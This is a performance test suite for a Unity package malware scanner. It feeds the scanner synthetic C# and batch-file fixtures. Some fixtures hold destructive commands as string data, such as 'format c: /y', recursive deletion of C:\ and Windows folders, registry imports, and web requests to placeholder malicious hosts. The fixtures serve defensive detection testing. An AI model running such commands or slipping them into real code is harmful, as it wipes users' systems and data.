import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { PatternMatcher } from '../../src/main/services/scanner/patternMatcher';
import { PackageParser } from '../../src/main/services/packageParser';
import { ExtractedFile } from '../../src/shared/types';
import * as path from 'path';
import * as os from 'os';

describe('Scanner Performance Tests', () => {
  let patternMatcher: PatternMatcher;
  let packageParser: PackageParser;
  let tempDir: string;

  beforeEach(async () => {
    patternMatcher = new PatternMatcher();
    await patternMatcher.initialize();

    tempDir = path.join(os.tmpdir(), `performance-test-${Date.now()}`);
    packageParser = new PackageParser(tempDir);
  });

  afterEach(async () => {
    await packageParser.cleanup();
  });

  describe('Pattern Matching Performance', () => {
    it('should process 1000 small files efficiently', () => {
      const files: ExtractedFile[] = [];
      
      // Generate 1000 small C# files
      for (let i = 0; i < 1000; i++) {
        files.push({
          path: `Assets/Scripts/Script${i}.cs`,
          type: 'script',
          size: 256,
          content: `using UnityEngine;
public class Script${i} : MonoBehaviour
{
    void Start()
    {
        Debug.Log("Hello from Script${i}");
    }
}`,
          guid: i.toString().padStart(32, '0')
        });
      }

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should process 1000 files in less than 2 seconds
      expect(processingTime).toBeLessThan(2000);
      
      // Clean files should not produce findings
      expect(findings).toHaveLength(0);

      console.log(`Processed 1000 clean files in ${processingTime.toFixed(2)}ms`);
    });

    it('should process files with suspicious patterns efficiently', () => {
      const files: ExtractedFile[] = [];
      
      // Generate files with varying numbers of suspicious patterns
      for (let i = 0; i < 100; i++) {
        files.push({
          path: `Assets/Scripts/SuspiciousScript${i}.cs`,
          type: 'script',
          size: 1024,
          content: `using UnityEngine;
using UnityEngine.Networking;
using System.Diagnostics;
using System.IO;

public class SuspiciousScript${i} : MonoBehaviour
{
    void Start()
    {
        // Multiple suspicious patterns
        UnityWebRequest.Get("https://malicious-site.com/data");
        Process.Start("cmd.exe");
        File.Delete("important.file");
        Directory.Delete("important/folder");
    }
}`,
          guid: i.toString().padStart(32, '0')
        });
      }

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should process 100 suspicious files in less than 1 second
      expect(processingTime).toBeLessThan(1000);
      
      // Should find multiple patterns per file
      expect(findings.length).toBeGreaterThan(100);

      console.log(`Processed 100 suspicious files in ${processingTime.toFixed(2)}ms, found ${findings.length} findings`);
    });

    it('should handle very large files efficiently', () => {
      // Create a very large C# file (100KB)
      const largeContent = Array(1000).fill(`
    void Method() {
        Debug.Log("This is a large method");
        var data = "Some data here";
        // More code...
    }`).join('\\n');

      const files: ExtractedFile[] = [
        {
          path: 'Assets/Scripts/VeryLargeScript.cs',
          type: 'script',
          size: largeContent.length,
          content: `using UnityEngine;
public class VeryLargeScript : MonoBehaviour
{
    ${largeContent}
}`,
          guid: 'large123456789abcdef123456789ab'
        }
      ];

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should process large file in less than 500ms
      expect(processingTime).toBeLessThan(500);
      
      console.log(`Processed large file (${largeContent.length} chars) in ${processingTime.toFixed(2)}ms`);
    });

    it('should scale linearly with number of patterns', () => {
      const files: ExtractedFile[] = [
        {
          path: 'Assets/Scripts/TestScript.cs',
          type: 'script',
          size: 512,
          content: `using UnityEngine;
using UnityEngine.Networking;
using System.Diagnostics;

public class TestScript : MonoBehaviour
{
    void Start()
    {
        UnityWebRequest.Get("https://example.com");
        Process.Start("test.exe");
    }
}`,
          guid: 'test1234567890abcdef1234567890ab'
        }
      ];

      // Measure baseline performance
      const startTime1 = performance.now();
      const findings1 = patternMatcher.scanFiles(files);
      const endTime1 = performance.now();
      const baselineTime = endTime1 - startTime1;

      // Process the same file 10 times (should scale roughly linearly)
      const multipleFiles = Array(10).fill(files[0]).map((file, index) => ({
        ...file,
        path: `Assets/Scripts/TestScript${index}.cs`,
        guid: index.toString().padStart(32, '0')
      }));

      const startTime2 = performance.now();
      const findings2 = patternMatcher.scanFiles(multipleFiles);
      const endTime2 = performance.now();
      const scaledTime = endTime2 - startTime2;

      // Scaled time should be roughly 10x baseline (with some tolerance)
      const expectedTime = baselineTime * 10;
      const tolerance = Math.max(expectedTime * 5, 50); // 500% tolerance or minimum 50ms for performance variation

      expect(scaledTime).toBeLessThan(tolerance);
      expect(findings2.length).toBe(findings1.length * 10);

      console.log(`Baseline: ${baselineTime.toFixed(2)}ms, Scaled: ${scaledTime.toFixed(2)}ms, Expected: ~${expectedTime.toFixed(2)}ms`);
    });
  });

  describe('Extension Detection Performance', () => {
    it('should process mixed file types efficiently', () => {
      const files: ExtractedFile[] = [];
      
      // Generate 500 files of various types
      for (let i = 0; i < 500; i++) {
        const fileTypes = ['dll', 'exe', 'script', 'other'] as const;
        const extensions = ['.dll', '.exe', '.cs', '.bat'];
        const typeIndex = i % fileTypes.length;
        
        files.push({
          path: `Assets/Files/File${i}${extensions[typeIndex]}`,
          type: fileTypes[typeIndex],
          size: 1024,
          content: typeIndex === 3 ? 'echo "test script"' : undefined, // Only scripts have content
          guid: i.toString().padStart(32, '0')
        });
      }

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should process 500 mixed files in less than 1 second
      expect(processingTime).toBeLessThan(1000);
      
      // Should detect DLL, EXE, and script files
      expect(findings.length).toBeGreaterThan(0);

      console.log(`Processed 500 mixed file types in ${processingTime.toFixed(2)}ms, found ${findings.length} findings`);
    });

    it('should handle content analysis efficiently', () => {
      const files: ExtractedFile[] = [];
      
      // Generate script files with varying content that requires analysis
      for (let i = 0; i < 100; i++) {
        files.push({
          path: `Assets/Scripts/Script${i}.bat`,
          type: 'other',
          size: 512,
          content: `@echo off
echo Starting script ${i}
${i % 2 === 0 ? 'format c: /y' : 'echo "Safe operation"'}
${i % 3 === 0 ? 'del /f /q c:\\\\*.*' : 'echo "Another safe operation"'}
${i % 5 === 0 ? 'regedit /s malicious.reg' : 'echo "Registry backup"'}
echo Script ${i} completed`,
          guid: i.toString().padStart(32, '0')
        });
      }

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should process 100 script files with content analysis in less than 500ms
      expect(processingTime).toBeLessThan(500);
      
      // Should detect suspicious content
      expect(findings.length).toBeGreaterThan(0);

      console.log(`Processed 100 scripts with content analysis in ${processingTime.toFixed(2)}ms`);
    });
  });

  describe('Memory Usage Performance', () => {
    it('should not leak memory during processing', async () => {
      if (typeof global.gc === 'function') {
        // Force garbage collection if available
        global.gc();
      }

      const initialMemory = process.memoryUsage().heapUsed;

      // Process files multiple times
      for (let iteration = 0; iteration < 10; iteration++) {
        const files: ExtractedFile[] = [];
        
        for (let i = 0; i < 100; i++) {
          files.push({
            path: `Assets/Scripts/Script${i}.cs`,
            type: 'script',
            size: 1024,
            content: `using UnityEngine;
public class Script${i} : MonoBehaviour
{
    void Start() { Debug.Log("Script ${i}"); }
}`,
            guid: i.toString().padStart(32, '0')
          });
        }

        const findings = patternMatcher.scanFiles(files);
        expect(findings).toBeDefined();
      }

      if (typeof global.gc === 'function') {
        global.gc();
      }

      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;

      // Memory increase should be reasonable (less than 50MB)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024);

      console.log(`Memory increase: ${(memoryIncrease / 1024 / 1024).toFixed(2)}MB`);
    });
  });

  describe('Concurrent Processing Performance', () => {
    it('should handle multiple simultaneous scans efficiently', async () => {
      const createFileSet = (prefix: string, count: number): ExtractedFile[] => {
        const files: ExtractedFile[] = [];
        for (let i = 0; i < count; i++) {
          files.push({
            path: `Assets/Scripts/${prefix}Script${i}.cs`,
            type: 'script',
            size: 512,
            content: `using UnityEngine;
public class ${prefix}Script${i} : MonoBehaviour
{
    void Start() { Debug.Log("${prefix} Script ${i}"); }
}`,
            guid: (prefix + i).padEnd(32, '0').slice(0, 32)
          });
        }
        return files;
      };

      const startTime = performance.now();

      // Run 5 scans concurrently
      const promises = Array(5).fill(null).map((_, index) => {
        const files = createFileSet(`Concurrent${index}`, 50);
        return Promise.resolve(patternMatcher.scanFiles(files));
      });

      const results = await Promise.all(promises);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should complete all concurrent scans in reasonable time
      expect(processingTime).toBeLessThan(2000);
      
      // All scans should complete successfully
      expect(results).toHaveLength(5);
      results.forEach(findings => {
        expect(Array.isArray(findings)).toBe(true);
      });

      console.log(`Completed 5 concurrent scans of 50 files each in ${processingTime.toFixed(2)}ms`);
    });
  });

  describe('Real-world Performance Benchmarks', () => {
    it('should handle typical Unity package size efficiently', () => {
      // Simulate a typical Unity package with mixed content
      const files: ExtractedFile[] = [
        // Scripts (30 files)
        ...Array(30).fill(null).map((_, i) => ({
          path: `Assets/Scripts/Script${i}.cs`,
          type: 'script' as const,
          size: 1024 + i * 100,
          content: `using UnityEngine;
using UnityEngine.UI;

public class Script${i} : MonoBehaviour
{
    [SerializeField] private Button button;
    
    void Start()
    {
        button.onClick.AddListener(OnClick);
    }
    
    private void OnClick()
    {
        Debug.Log("Button clicked in Script${i}");
    }
}`,
          guid: `script${i}`.padEnd(32, '0').slice(0, 32)
        })),
        
        // DLLs (5 files)
        ...Array(5).fill(null).map((_, i) => ({
          path: `Assets/Plugins/Plugin${i}.dll`,
          type: 'dll' as const,
          size: 2048 * (i + 1),
          guid: `dll${i}`.padEnd(32, '0').slice(0, 32)
        })),
        
        // Assets (50 files)
        ...Array(50).fill(null).map((_, i) => ({
          path: `Assets/Prefabs/Prefab${i}.prefab`,
          type: 'asset' as const,
          size: 512 + i * 50,
          guid: `asset${i}`.padEnd(32, '0').slice(0, 32)
        })),
        
        // Textures (20 files)
        ...Array(20).fill(null).map((_, i) => ({
          path: `Assets/Textures/Texture${i}.png`,
          type: 'texture' as const,
          size: 4096 * (i + 1),
          guid: `texture${i}`.padEnd(32, '0').slice(0, 32)
        }))
      ];

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should process typical package (105 files) in less than 1 second
      expect(processingTime).toBeLessThan(1000);
      
      // Should detect DLL files
      expect(findings.some(f => f.category === 'dll')).toBe(true);
      
      const totalFileSize = files.reduce((sum, file) => sum + file.size, 0);
      const processingRate = totalFileSize / processingTime; // bytes per ms

      console.log(`Processed ${files.length} files (${(totalFileSize / 1024).toFixed(1)}KB) in ${processingTime.toFixed(2)}ms`);
      console.log(`Processing rate: ${(processingRate / 1024).toFixed(2)} KB/ms`);
    });

    it('should handle package with many suspicious patterns efficiently', () => {
      // Create a package with intentionally many suspicious patterns
      const files: ExtractedFile[] = [
        {
          path: 'Assets/Scripts/Highlysuspicious.cs',
          type: 'script',
          size: 4096,
          content: `using UnityEngine;
using UnityEngine.Networking;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

public class HighlySuspicious : MonoBehaviour
{
    void Start()
    {
        // Network activity
        UnityWebRequest.Get("https://malicious1.com");
        UnityWebRequest.Post("https://malicious2.com", "data");
        new WWW("https://malicious3.com");
        
        // Process execution
        Process.Start("cmd.exe", "/c format c:");
        Process.Start("powershell.exe", "-Command \\"Remove-Item -Force -Recurse C:\\\\*\\"");
        
        // File operations
        File.Delete("C:\\\\Windows\\\\System32\\\\important.dll");
        File.WriteAllBytes("malware.exe", new byte[0]);
        Directory.Delete("C:\\\\Windows", true);
        
        // Registry operations
        Registry.SetValue("HKEY_LOCAL_MACHINE", "malicious", "value");
        
        // Reflection
        Assembly.LoadFrom("malicious.dll");
        Type.GetType("MaliciousType").GetMethod("Execute").Invoke(null, null);
        Activator.CreateInstance(Type.GetType("Malware"));
        
        // Native calls
        System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(System.IntPtr.Zero, typeof(System.Action));
    }
}`,
          guid: 'suspicious123456789abcdef123456'
        },
        ...Array(10).fill(null).map((_, i) => ({
          path: `Assets/Plugins/malware${i}.dll`,
          type: 'dll' as const,
          size: 1024,
          guid: `malware${i}`.padEnd(32, '0').slice(0, 32)
        })),
        ...Array(5).fill(null).map((_, i) => ({
          path: `Assets/Scripts/script${i}.bat`,
          type: 'other' as const,
          size: 256,
          content: `@echo off
format c: /y
del /f /q c:\\\\*.*
regedit /s malicious.reg
powershell -Command "Remove-Item -Force -Recurse C:\\\\*"`,
          guid: `script${i}`.padEnd(32, '0').slice(0, 32)
        }))
      ];

      const startTime = performance.now();
      const findings = patternMatcher.scanFiles(files);
      const endTime = performance.now();

      const processingTime = endTime - startTime;

      // Should handle highly suspicious package efficiently
      expect(processingTime).toBeLessThan(500);
      
      // Should detect many findings
      expect(findings.length).toBeGreaterThan(20);
      
      // Should have findings from all severity levels
      expect(findings.some(f => f.severity === 'critical')).toBe(true);
      expect(findings.some(f => f.severity === 'warning')).toBe(true);

      console.log(`Processed highly suspicious package in ${processingTime.toFixed(2)}ms, found ${findings.length} findings`);
    });
  });
});